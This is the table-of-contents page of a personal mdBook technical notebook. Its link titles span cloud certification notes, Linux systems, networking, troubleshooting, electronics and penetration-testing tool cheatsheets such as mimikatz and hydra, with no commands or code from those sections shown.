<!DOCTYPE HTML>
<html lang="en" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>notebook</title>
        <meta name="robots" content="noindex">


        <!-- Custom HTML head -->
        <link rel="icon" href="theme/logo.png">
        

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon-de23e50b.svg">
        <link rel="shortcut icon" href="favicon-8114d1fc.png">
        <link rel="stylesheet" href="css/variables-8adf115d.css">
        <link rel="stylesheet" href="css/general-2459343d.css">
        <link rel="stylesheet" href="css/chrome-9dfbd86b.css">
        <link rel="stylesheet" href="css/print-9e4910d8.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="fonts/fonts-9644e21d.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="mdbook-highlight-css" href="highlight-493f70e1.css">
        <link rel="stylesheet" id="mdbook-tomorrow-night-css" href="tomorrow-night-4c0ae647.css">
        <link rel="stylesheet" id="mdbook-ayu-highlight-css" href="ayu-highlight-3fdfc3ac.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="theme/custom-e80eafda.css">


        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "";
            const default_light_theme = "light";
            const default_dark_theme = "navy";
            window.path_to_searchindex_js = "searchindex-45f66119.js";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="toc-9a594cb9.js"></script>
    </head>
    <body>
    <div id="mdbook-help-container">
        <div id="mdbook-help-popup">
            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
            <div>
                <p>Press <kbd>‚Üê</kbd> or <kbd>‚Üí</kbd> to navigate between chapters</p>
                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
                <p>Press <kbd>?</kbd> to show this help</p>
                <p>Press <kbd>Esc</kbd> to hide this help</p>
            </div>
        </div>
    </div>
    <div id="mdbook-body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="mdbook-sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("mdbook-sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
                sidebar_toggle.checked = false;
            }
            if (sidebar === 'visible') {
                sidebar_toggle.checked = true;
            } else {
                html.classList.remove('sidebar-visible');
            }
        </script>

        <nav id="mdbook-sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
            </noscript>
            <div id="mdbook-sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="mdbook-page-wrapper" class="page-wrapper">

            <div class="page">
                <a href="https://rnemeth90.github.io" class="back-to-blog">
                    üè† Back to Blog
                </a>
                
                <div id="mdbook-menu-bar-hover-placeholder"></div>
                <div id="mdbook-menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="mdbook-sidebar-toggle" class="icon-button" for="mdbook-sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="mdbook-sidebar">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M0 96C0 78.3 14.3 64 32 64H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32C14.3 128 0 113.7 0 96zM0 256c0-17.7 14.3-32 32-32H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32zM448 416c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32H416c17.7 0 32 14.3 32 32z"/></svg></span>
                        </label>
                        <button id="mdbook-theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="mdbook-theme-list">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M371.3 367.1c27.3-3.9 51.9-19.4 67.2-42.9L600.2 74.1c12.6-19.5 9.4-45.3-7.6-61.2S549.7-4.4 531.1 9.6L294.4 187.2c-24 18-38.2 46.1-38.4 76.1L371.3 367.1zm-19.6 25.4l-116-104.4C175.9 290.3 128 339.6 128 400c0 3.9 .2 7.8 .6 11.6c1.8 17.5-10.2 36.4-27.8 36.4H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H240c61.9 0 112-50.1 112-112c0-2.5-.1-5-.2-7.5z"/></svg></span>
                        </button>
                        <ul id="mdbook-theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-ayu">Ayu</button></li>
                        </ul>
                        <button id="mdbook-search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="mdbook-searchbar">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352c79.5 0 144-64.5 144-144s-64.5-144-144-144S64 128.5 64 208s64.5 144 144 144z"/></svg></span>
                        </button>
                    </div>

                    <h1 class="menu-title">notebook</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <span class=fa-svg id="print-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M128 0C92.7 0 64 28.7 64 64v96h64V64H354.7L384 93.3V160h64V93.3c0-17-6.7-33.3-18.7-45.3L400 18.7C388 6.7 371.7 0 354.7 0H128zM384 352v32 64H128V384 368 352H384zm64 32h32c17.7 0 32-14.3 32-32V256c0-35.3-28.7-64-64-64H64c-35.3 0-64 28.7-64 64v96c0 17.7 14.3 32 32 32H64v64c0 35.3 28.7 64 64 64H384c35.3 0 64-28.7 64-64V384zm-16-88c-13.3 0-24-10.7-24-24s10.7-24 24-24s24 10.7 24 24s-10.7 24-24 24z"/></svg></span>
                        </a>

                    </div>
                </div>

                <div id="mdbook-search-wrapper" class="hidden">
                    <form id="mdbook-searchbar-outer" class="searchbar-outer">
                        <div class="search-wrapper">
                            <input type="search" id="mdbook-searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="mdbook-searchresults-outer" aria-describedby="searchresults-header">
                            <div class="spinner-wrapper">
                                <span class=fa-svg id="fa-spin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M304 48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zm0 416c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM48 304c26.5 0 48-21.5 48-48s-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48zm464-48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM142.9 437c18.7-18.7 18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zm0-294.2c18.7-18.7 18.7-49.1 0-67.9S93.7 56.2 75 75s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zM369.1 437c18.7 18.7 49.1 18.7 67.9 0s18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9z"/></svg></span>
                            </div>
                        </div>
                    </form>
                    <div id="mdbook-searchresults-outer" class="searchresults-outer hidden">
                        <div id="mdbook-searchresults-header" class="searchresults-header"></div>
                        <ul id="mdbook-searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('mdbook-sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('mdbook-sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#mdbook-sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="mdbook-content" class="content">
                    <main>
                        <h1 id="summary"><a class="header" href="#summary">Summary</a></h1>
<p>These are my notes, there are many like them, but these ones are mine.</p>
<ul>
<li><a href="#summary">Summary</a></li>
<li><a href="cheatsheets/README.html">Cheatsheets</a>
<ul>
<li><a href="#api-architectural-styles">API Architectural Styles</a></li>
<li><a href="#cap-theorem">cap theorem</a></li>
<li><a href="#standard-http-headers">standard http headers</a></li>
<li><a href="#latency-numbers-every-sre-should-know">Latency Numbers Every SRE Should Know</a></li>
<li><a href="#make-files">Make Files</a></li>
<li><a href="#neovim-cheatsheet">Neovim</a></li>
<li><a href="#nmap-cheatsheet">nmap</a></li>
<li><a href="#medusa-cheatsheet">medusa</a></li>
<li><a href="#hydra-cheatsheet">hydra</a></li>
<li><a href="#ranger-cheatsheet">Ranger</a></li>
<li><a href="#metasploit-cheatsheet">Metasploit</a></li>
<li><a href="#regex-cheatsheet">Regex</a></li>
<li><a href="#sql-cheat-sheet">SQL</a></li>
<li><a href="#multi-line-strings">yaml</a></li>
<li><a href="#ffuf-cheatsheet">ffuf</a></li>
<li><a href="#hashcat-cheatsheet">hashcat</a></li>
<li><a href="#wafw00f-cheatsheet">wafw00f</a></li>
<li><a href="#nikto-cheatsheet">nikto</a></li>
<li><a href="#powershell-file-transfer">powershell</a></li>
<li><a href="#ncat-file-transfer">ncat</a></li>
<li><a href="#netcat-file-transfer">netcat</a></li>
<li><a href="#rdp-file-transfer">rdp</a></li>
<li><a href="#msfvenom-cheat-sheet">msfvenom</a></li>
<li><a href="#john-the-ripper-cheatsheet">john the ripper</a></li>
<li><a href="#pypykatz-cheatsheet">pypykatz</a></li>
<li><a href="#lazagne-cheatsheet">lazagne</a></li>
<li><a href="#windows-credential-manager-cheatsheet">windows-credential-manager</a></li>
<li><a href="#server-side-template-injection">server-side template injection</a></li>
<li><a href="#mimikatz-cheatsheet">mimikatz</a></li>
<li><a href="#unshadow-cheatsheet">unshadow</a></li>
<li><a href="#rubeus-cheatsheet">rubeus</a></li>
<li><a href="#ssh-cheatsheet">ssh</a></li>
</ul>
</li>
<li><a href="clouds/README.html">Clouds</a>
<ul>
<li><a href="clouds/aws/README.html">AWS</a>
<ul>
<li><a href="clouds/aws/dva-c02/README.html">DVA-C02-notes</a>
<ul>
<li><a href="#elastic-beanstalk">Elastic Beanstalk</a></li>
<li><a href="#cloudformation">CloudFormation</a></li>
<li><a href="#cloudfront">CloudFront</a></li>
<li><a href="#copilot">Copilot</a></li>
<li><a href="#elastic-container-registry">Elastic Container Registry</a></li>
<li><a href="#elastic-container-service">Elastic Container Service</a></li>
<li><a href="#dynamodb">Dynamodb</a></li>
<li><a href="#ec2">EC2</a></li>
<li><a href="#elasticache">Elasticache</a></li>
<li><a href="#iam">IAM</a></li>
<li><a href="#kinesis">Kinesis</a></li>
<li><a href="#lambda">Lambda</a></li>
<li><a href="#cloudtrail">CloudTrail</a></li>
<li><a href="#cloudwatch">CloudWatch</a></li>
<li><a href="#x-ray">x-ray</a></li>
<li><a href="#aurora">Aurora</a></li>
<li><a href="#rds-relational-database-service">RDS (Relational Database Service)</a></li>
<li><a href="#route53">Route53</a></li>
<li><a href="#s3">S3</a></li>
<li><a href="#simple-notification-system">Simple Notification System</a></li>
<li><a href="#simple-queue-system">Simple Queue System</a></li>
<li><a href="#vpc">VPC</a></li>
</ul>
</li>
<li><a href="clouds/aws/saa-c03/README.html">AWS-Solutions-Architect-Associate-notes</a>
<ul>
<li><a href="#aws-certified-solutions-architect-associate-practice-exams">AWS Certified Solutions Architect Associate Practice Exams</a></li>
<li><a href="#table-of-contents-10">Table of Contents</a></li>
<li><a href="#study-more">Study-more</a></li>
<li><a href="#tutorialsdojo-cheatsheets">Tutorialsdojo Cheatsheets</a>
<ul>
<li><a href="#api-gateway-cheatsheet">Api-gateway-cheatsheet</a></li>
<li><a href="#queueing-sqs-1">Queueing (SQS)</a></li>
<li><a href="#cloudfront-cheatsheet">Cloudfront-cheatsheet</a></li>
<li><a href="#cloudfront-3">CloudFront</a></li>
<li><a href="#what-is-database--1">What is Database ?</a></li>
<li><a href="#disaster-recovery">Disaster Recovery</a></li>
<li><a href="#disaster-recovery-cheatsheet">Disaster-recovery-cheatsheet</a></li>
<li><a href="#savings-plan-1">Savings Plan</a></li>
<li><a href="#ec2-3">EC2</a></li>
<li><a href="#elastic-load-balancer-1">Elastic Load Balancer</a></li>
<li><a href="#elastic-file-system-efs-1">Elastic File System (EFS)</a></li>
<li><a href="#what-is-elasticache-for-redis-1">What is ElastiCache for Redis?</a></li>
<li><a href="#glue-cheatsheet">Glue-cheatsheet</a></li>
<li><a href="#aws-lambda-1">AWS Lambda</a></li>
<li><a href="#ml-models">Ml-models</a></li>
<li><a href="#what-is-amazon-quicksight--1">What is Amazon QuickSight ?</a></li>
<li><a href="#aurora-cheatsheet-1">Aurora Cheatsheet</a></li>
<li><a href="#rds-2">RDS</a></li>
<li><a href="#amazon-redshift-1">Amazon Redshift</a></li>
<li><a href="#dns-4">DNS</a></li>
<li><a href="#iam-1">IAM</a></li>
<li><a href="#aws-certificate-manager">AWS Certificate Manager</a></li>
<li><a href="#storage-cheatsheet">Storage-cheatsheet</a></li>
<li><a href="#introduction-to-s3-1">Introduction to S3</a></li>
<li><a href="#vpc-endpoint-cheatsheet">Vpc-endpoint-cheatsheet</a></li>
<li><a href="#vpc-flow-logs-cheatsheet">Vpc-flow-logs-cheatsheet</a></li>
<li><a href="#introduction-to-vpc-1">Introduction to VPC</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="clouds/azure/README.html">Azure</a>
<ul>
<li><a href="clouds/azure/az700/readme.html">Core Networking Infrastructure Checklist</a>
<ul>
<li><a href="clouds/azure/az700/design-and-implement-core-network-infra/README.html">Design-and-implement-core-network-infra</a>
<ul>
<li><a href="#ipv4-and-ipv6-addressing">IPv4 and IPv6 Addressing</a></li>
<li><a href="#azure-dns">Azure DNS</a></li>
<li><a href="#azure-virtual-network-nat">Azure Virtual Network NAT</a></li>
<li><a href="#subnets">Subnets</a></li>
<li><a href="#virtual-machine-scale-sets">Virtual Machine Scale Sets</a></li>
<li><a href="#azure-virtual-network-vnet">Azure Virtual Network (VNet)</a></li>
</ul>
</li>
<li><a href="clouds/azure/az700/design-and-implement-private-access/README.html">Design-and-implement-private-access</a>
<ul>
<li><a href="#private-link">Private Link</a></li>
<li><a href="#azure-service-endpoint">Azure Service Endpoint</a></li>
</ul>
</li>
<li><a href="clouds/azure/az700/design-and-implement-routing/README.html">Design-and-implement-routing</a>
<ul>
<li><a href="#application-gateway">Application Gateway</a></li>
<li><a href="#azure-availability-sets">Azure Availability Sets</a></li>
<li><a href="#azure-front-door">Azure Front Door</a></li>
<li><a href="#azure-load-balancer">Azure Load Balancer</a></li>
<li><a href="#azure-virtual-network-routing">Azure Virtual Network Routing</a></li>
<li><a href="#traffic-manager">Traffic Manager</a></li>
</ul>
</li>
<li><a href="clouds/azure/az700/design-implement-and-manage-hybrid-networking/README.html">Design-implement-and-manage-hybrid-networking</a>
<ul>
<li><a href="#azure-express-route">Azure Express Route</a></li>
<li><a href="#vpn">VPN</a></li>
<li><a href="#azure-virtual-wan">Azure Virtual WAN</a></li>
</ul>
</li>
<li><a href="clouds/azure/az700/secure-and-monitor-networks/README.html">Secure-and-monitor-networks</a>
<ul>
<li><a href="#application-security-groups">Application Security Groups</a></li>
<li><a href="#azure-firewall">Azure Firewall</a></li>
<li><a href="#ddos-protection">DDoS Protection</a></li>
<li><a href="#network-watcher">Network Watcher</a></li>
<li><a href="#network-security-groups">Network Security Groups</a></li>
<li><a href="#web-application-firewall">Web Application Firewall</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#assembly">Assembly</a></li>
<li><a href="#the-4-steps-of-compilation-with-gcc">The 4 Steps of Compilation with GCC</a></li>
<li><a href="#c-programming-notes">C Programming Notes</a></li>
<li><a href="#the-bufio-package">the bufio package</a></li>
<li><a href="#go-projects">Go-projects</a></li>
<li><a href="#immutability-1">Immutability</a></li>
<li><a href="#imperative-programming">Imperative-programming</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="compsci/README.html">Computer Science</a>
<ul>
<li><a href="#measuring-algorithm-performance">Algorithms</a></li>
<li><a href="#computer-architecture">Computer Architecture</a></li>
<li><a href="#data-structures">Data Structures</a></li>
<li><a href="#euclids-algorithm">Euclid‚Äôs Algorithm</a></li>
<li><a href="#fizzbuzz">fizzbuzz</a></li>
<li><a href="#graph-theory">Graph Theory</a></li>
<li><a href="#hashing">Hashing</a></li>
<li><a href="#string-algorithms">string algorithms</a></li>
</ul>
</li>
<li><a href="databases/README.html">Databases</a>
<ul>
<li><a href="#mysql">MySQL</a></li>
<li><a href="#mssql">MSSQL</a></li>
<li><a href="#oracle-tns">Oracle</a></li>
</ul>
</li>
<li><a href="devops/README.html">DevOps</a>
<ul>
<li><a href="#devops-principles">DevOps Principles</a></li>
</ul>
</li>
<li><a href="kubernetes/README.html">Kubernetes</a>
<ul>
<li><a href="kubernetes/cks/README.html">CKS</a>
<ul>
<li><a href="#certified-kubernetes-security-specialist-cks-notes">Certified Kubernetes Security Specialist (CKS) Notes</a></li>
<li><a href="#kubernetes-security-specialist-cks-practice-scenarios">Kubernetes Security Specialist (CKS) Practice Scenarios</a></li>
</ul>
</li>
<li><a href="kubernetes/kcna/README.html">KCNA</a>
<ul>
<li><a href="#kubernetes-certified-native-associate-kcna-notes">Kubernetes Certified Native Associate (KCNA) Notes</a></li>
</ul>
</li>
<li><a href="kubernetes/kcsa/README.html">KCSA</a>
<ul>
<li><a href="#kubernetes-certified-security-associate-kcsa-notes">Kubernetes Certified Security Associate (KCSA) Notes</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="networking/README.html">Networking</a>
<ul>
<li><a href="networking/browser-networking/README.html">Browser Networking</a>
<ul>
<li><a href="#chapter-1">Chapter 1</a></li>
<li><a href="#chapter-2">Chapter 2</a></li>
<li><a href="#chapter-3">Chapter 3</a></li>
<li><a href="#chapter-4">Chapter 4</a></li>
<li><a href="#chapter09">Chapter09</a></li>
<li><a href="#chapter-10">Chapter 10</a></li>
<li><a href="#chapter-11">Chapter 11</a></li>
<li><a href="#chapter12">Chapter12</a></li>
<li><a href="#chapter-13">Chapter 13</a></li>
<li><a href="#chapter-15">Chapter 15</a></li>
<li><a href="#chapter-16">Chapter 16</a></li>
<li><a href="#chapter-17">Chapter 17</a></li>
</ul>
</li>
<li><a href="networking/http/README.html">HTTP</a>
<ul>
<li><a href="#clean-urls">Clean URLs</a></li>
<li><a href="#http-persistent-connection">HTTP Persistent Connection</a></li>
<li><a href="#urn">URN</a></li>
</ul>
</li>
<li><a href="networking/load-balancing/README.html">Load Balancing</a>
<ul>
<li><a href="#load-balancing-1">load balancing</a></li>
</ul>
</li>
<li><a href="networking/nginx/README.html">Nginx</a>
<ul>
<li><a href="#set-header">set header</a></li>
</ul>
</li>
<li><a href="networking/rate-limiting/README.html">Rate Limiting Algorithms</a>
<ul>
<li><a href="#fixed-window-counter-algorithm">Fixed Window Counter Algorithm</a></li>
<li><a href="#leaking-bucket-algorithm">Leaking Bucket Algorithm</a></li>
<li><a href="#token-bucket-algorithm">TOKEN BUCKET ALGORITHM</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="networking/protocols/README.html">Protocols</a>
<ul>
<li><a href="#dns-2">DNS</a></li>
<li><a href="#ftp">FTP</a></li>
<li><a href="#icmp">ICMP</a></li>
<li><a href="#imap--pop3">IMAP/POP3</a></li>
<li><a href="#mqtt">MQTT</a></li>
<li><a href="#nfs-network-file-system">NFS</a></li>
<li><a href="#ntp">NTP</a></li>
<li><a href="#quic">QUIC</a></li>
<li><a href="#server-message-block-smb">SMB</a></li>
<li><a href="#smtp-simple-mail-transfer-protocol">SMTP</a></li>
<li><a href="#snmp">SNMP</a></li>
<li><a href="#ssh">SSH</a></li>
<li><a href="#tls">TLS</a></li>
<li><a href="#udp-1">UDP</a></li>
<li><a href="#websockets">WebSockets</a></li>
<li><a href="#ipmi">IPMI</a></li>
</ul>
</li>
<li><a href="redis/README.html">Redis</a>
<ul>
<li><a href="#redis-2">redis</a></li>
</ul>
</li>
<li><a href="systems/README.html">Systems</a>
<ul>
<li><a href="#linux-kernel-boot-process">Linux Kernel Boot Process</a></li>
<li><a href="#common-files-and-directories">Common Files and Directories</a></li>
<li><a href="#dev-tools">Dev Tools</a></li>
<li><a href="#devices">devices</a></li>
<li><a href="#disks">Disks</a></li>
<li><a href="#file-systems">file systems</a></li>
<li><a href="#groups-1">Groups</a></li>
<li><a href="#hashing-1">Hashing</a></li>
<li><a href="#interrupts-and-traps">Interrupts and Traps</a></li>
<li><a href="#kernel-subsystems">kernel subsystems</a></li>
<li><a href="#key-value-store">Key Value Store</a></li>
<li><a href="#hard-and-soft-links">Hard and Soft Links</a></li>
<li><a href="#commands-2">commands</a></li>
<li><a href="#logging">Logging</a></li>
<li><a href="#lvm-logical-volume-manager">lvm (logical volume manager)</a></li>
<li><a href="#make">make</a></li>
<li><a href="#memory">memory</a></li>
<li><a href="#memory-management">Memory Management</a></li>
<li><a href="#network-manager">network manager</a></li>
<li><a href="#networking-1">Networking</a></li>
<li><a href="#linux-observability-sources">Linux Observability Sources</a></li>
<li><a href="#pluggable-authentication-modules-pam">Pluggable Authentication Modules (PAM)</a></li>
<li><a href="#per-process-analysis">Per-Process Analysis</a></li>
<li><a href="#permissions">Permissions</a></li>
<li><a href="#processes">processes</a></li>
<li><a href="#scheduled-tasks">Scheduled Tasks</a></li>
<li><a href="#bash-startup-files">Bash Startup Files</a></li>
<li><a href="#troubleshooting-storage">Troubleshooting Storage</a></li>
<li><a href="#system-calls">System Calls</a></li>
<li><a href="#system-wide-analysis">System Wide Analysis</a></li>
<li><a href="#systemd">Systemd</a></li>
<li><a href="#the-first-60-seconds">The first 60 seconds</a></li>
<li><a href="#time">time</a></li>
<li><a href="#troubleshooting-1">troubleshooting</a></li>
<li><a href="#users-and-user-management">Users and User Management</a></li>
<li><a href="systems/bash/README.html">Bash</a>
<ul>
<li><a href="#bash-notes">bash notes</a></li>
<li><a href="#moving-the-cursor-1">Moving the cursor:</a></li>
</ul>
</li>
<li><a href="systems/commands/README.html">Commands</a>
<ul>
<li><a href="#chgrp">chgrp</a></li>
<li><a href="#chmod">Chmod</a></li>
<li><a href="#chown">chown</a></li>
<li><a href="#dd">dd</a></li>
<li><a href="#groups-2">groups</a></li>
<li><a href="#ip">ip</a></li>
<li><a href="#job-control">Job Control</a></li>
<li><a href="#kill">Kill</a></li>
<li><a href="#lsscsi">lsscsi</a></li>
<li><a href="#passwd">passwd</a></li>
<li><a href="#ps">ps</a></li>
<li><a href="#umask">umask</a></li>
</ul>
</li>
<li><a href="systems/greybeard-qualification/README.html">Greybeard Qualification</a>
<ul>
<li><a href="#block-devices-and-file-systems">Block Devices and File Systems</a></li>
<li><a href="#memory-management-1">Memory Management</a></li>
<li><a href="#execution-and-scheduling-of-processes-and-threads">Execution and Scheduling of Processes and Threads</a></li>
<li><a href="#process-structure-and-ipc">Process Structure and IPC</a></li>
<li><a href="#startup-and-init">Startup and Init</a></li>
</ul>
</li>
<li><a href="systems/linux-kernel-development/README.html">Linux Kernel Development</a>
<ul>
<li><a href="#building-the-linux-kernel">Building the Linux Kernel</a></li>
<li><a href="#kernel-modules">Kernel Modules</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="tools/README.html">Tools</a>
<ul>
<li><a href="#need-to-addrefine">Need to add/refine:</a></li>
<li><a href="#instructions-for-using-dnspinger">instructions for using dnspinger</a></li>
<li><a href="#nmap-1">nmap</a></li>
<li><a href="#medusa">medusa</a></li>
<li><a href="#hydra">hydra</a></li>
<li><a href="#ffuf">ffuf</a></li>
<li><a href="#hashcat">hashcat</a></li>
<li><a href="#metasploit-framework">metasploit</a></li>
<li><a href="#msfvenom">msfvenom</a></li>
<li><a href="#john-the-ripper">john the ripper</a></li>
<li><a href="#pypykatz">pypykatz</a></li>
<li><a href="#lazagne">lazagne</a></li>
<li><a href="#unshadow">unshadow</a></li>
<li><a href="#rubeus">rubeus</a></li>
<li><a href="#mimikatz">mimikatz</a></li>
</ul>
</li>
<li><a href="troubleshooting/README.html">Troubleshooting</a>
<ul>
<li><a href="#performance-mantras">Performance Mantras</a></li>
<li><a href="#the-problem-statement">The Problem Statement</a></li>
<li><a href="#red-method">RED Method</a></li>
<li><a href="#use-method">USE Method</a></li>
<li><a href="troubleshooting/linux/README.html">Linux</a>
<ul>
<li><a href="#troubleshooting-memory">Troubleshooting Memory</a></li>
</ul>
</li>
<li><a href="troubleshooting/troubleshooting_playbook/README.html">Troubleshooting Playbook</a>
<ul>
<li><a href="#troubleshooting-503s-for-apps-in-kubernetes">Troubleshooting 503s for Apps in Kubernetes</a></li>
<li><a href="#general-troubleshootingnotes">General troubleshooting/notes</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="what-happens-when/README.html">What Happens When‚Ä¶</a>
<ul>
<li><a href="#what-happens-when-a-cpu-starts">What happens when a CPU starts?</a></li>
</ul>
</li>
<li><a href="fun/README.html">Fun</a>
<ul>
<li><a href="#modifying-machine-code-in-executables">Modify Machine Code</a>
<ul>
<li><a href="infosec/README.html">InfoSec</a></li>
<li><a href="#cracking-protected-files-and-archives">cracking-protected-files</a></li>
<li><a href="#crawling">crawling</a></li>
<li><a href="#robotstxt">robots.text</a></li>
<li><a href="#shell-harnesses">shell-harnesses</a></li>
<li><a href="#shells-and-payloads">shell-payloads</a></li>
<li><a href="#well-known-uris">well-known-uris</a></li>
<li><a href="#enumeration-1">Enumeration</a></li>
<li><a href="#footprinting-9">footprinting</a></li>
<li><a href="#hydra-1">Brute-Forcing</a></li>
<li><a href="#cve-common-vulnerabilities-and-exposures">CVE</a></li>
<li><a href="#cvss-common-vulnerability-scoring-system">CVSS</a></li>
<li><a href="#laudanum">Laudanum</a></li>
<li><a href="#linux-file-transfer-methods">Linux File Transfer Methods</a></li>
<li><a href="#windows-file-transfer-methods">Windows File Transfer Methods</a></li>
<li><a href="#windows-authentication-process">windows-auth</a></li>
<li><a href="#attacking-windows-credential-manager">attacking-cred-mgr</a></li>
<li><a href="#attacking-active-directory">Active Directory Domain Services</a></li>
<li><a href="#linux-authentication">linux-auth</a></li>
<li><a href="#pass-the-hash-pth-attacks">Pass The Hash</a></li>
<li><a href="#pass-the-ticket-ptt-attacks">Pass the Ticket</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="electronics/README.html">Electronics</a>
<ul>
<li><a href="#ohms-law">Laws</a></li>
<li><a href="#resistors">Resistors</a></li>
<li><a href="#capacitors">Capacitors</a></li>
<li><a href="#inductors">Inductors</a></li>
<li><a href="#diodes">Diodes</a></li>
<li><a href="#transistors">Transistors</a></li>
